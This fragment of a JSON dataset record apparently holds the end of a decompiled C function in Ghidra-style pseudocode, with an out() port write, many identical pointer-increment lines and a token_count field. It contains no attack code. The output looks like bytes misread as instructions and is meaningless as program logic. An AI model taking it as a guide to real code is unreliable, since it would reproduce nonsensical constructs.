*pcVar2 + cVar1;\n    pcVar2[in_GS_OFFSET] = pcVar2[in_GS_OFFSET] + cVar1;\n    out(*puVar8, uVar4);\n    pcVar2[in_GS_OFFSET] = pcVar2[in_GS_OFFSET] + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    *pcVar2 = *pcVar2 + cVar1;\n    return;\n}\n",
        "token_count": 19939
    }
}